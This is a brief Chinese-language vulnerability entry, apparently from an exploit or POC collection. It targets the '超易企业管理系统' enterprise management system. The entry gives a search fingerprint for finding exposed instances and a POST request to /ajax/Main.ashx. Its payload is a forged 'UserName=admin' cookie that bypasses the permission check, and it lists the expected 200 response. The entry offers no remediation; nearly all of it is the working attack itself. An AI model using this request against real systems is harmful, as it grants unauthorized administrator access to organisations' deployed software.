# 超易企业管理系统Main.ashx存在权限绕过漏洞

超易企业管理系统 ｜ 认证/授权绕过 ｜ —
- **指纹**：`body="超易企业管理系统"`
- **请求**：`POST /ajax/Main.ashx HTTP/1.1`

**Payload**
```
在cookie中添加UserName=admin;即可绕过权限校验
Host:
X-Requested-With: XMLHttpRequest
Cookie: UserName=admin;
Content-Length: 0
```
- **响应特征**：200